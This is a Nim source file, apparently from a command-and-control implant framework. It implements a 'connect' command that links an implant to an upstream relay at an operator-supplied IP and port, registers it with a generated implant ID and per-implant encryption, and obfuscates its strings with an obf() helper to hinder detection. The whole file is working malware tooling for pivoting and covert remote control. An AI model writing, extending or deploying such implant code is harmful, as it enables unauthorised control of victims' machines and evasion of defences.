import strutils, net
import ../../core/relay/[relay_protocol, relay_comm, relay_config]
import ../../util/strenc

# Global relay connection instance
var g_relayConnection: RelayConnection
# Note: g_relayImplant is defined in relay.nim to avoid redefinition

# CONNECT command - connect to upstream relay
proc connect*(args: seq[string]): string =
    try:
        if args.len < 1:
            return obf("ERROR: Usage: connect relay://IP:PORT")
        
        let relayUrl = args[0]
        
        # Parse relay URL format: relay://IP:PORT
        if not relayUrl.startsWith("relay://"):
            return obf("ERROR: Invalid relay URL format. Use: relay://IP:PORT")
        
        let urlParts = relayUrl[8..^1].split(":")
        if urlParts.len != 2:
            return obf("ERROR: Invalid relay URL format. Use: relay://IP:PORT")
        
        let host = urlParts[0]
        let port = parseInt(urlParts[1])
        
        if port < 1 or port > 65535:
            return obf("ERROR: Invalid port number. Must be between 1-65535")
        
        # Check if already connected
        if g_relayConnection.isConnected:
            return obf("ERROR: Already connected to relay at ") & g_relayConnection.remoteHost & ":" & $g_relayConnection.remotePort
        
        # Connect to relay
        g_relayConnection = connectToRelay(host, port)
        
        if g_relayConnection.isConnected:
            # Initialize relay implant with unique ID and derived key
            let implantID = generateImplantID("IMPLANT")
            var localRelayImplant = initRelayImplant(implantID)
            localRelayImplant.upstreamHost = host
            localRelayImplant.upstreamPort = port
            localRelayImplant.isConnected = true
            
            # Send registration message with per-implant encryption
            let route = @[localRelayImplant.id, "RELAY"]
            let registerMsg = createRegisterMessage(localRelayImplant.id, route)
            
            if sendMessage(g_relayConnection, registerMsg):
                when defined verbose:
                    echo obf("[DEBUG]: Connected to relay and sent registration for implant ") & implantID
                
                return obf("SUCCESS: Connected to relay at ") & host & ":" & $port & obf(" as implant ") & implantID
            else:
                closeConnection(g_relayConnection)
                return obf("ERROR: Connected to relay but failed to send registration")
        else:
            return obf("ERROR: Failed to connect to relay at ") & host & ":" & $port
            
    except ValueError:
        return obf("ERROR: Invalid port number format")
    except:
        let msg = getCurrentExceptionMsg()
        return obf("ERROR: Failed to connect to relay. Exception: ") & msg 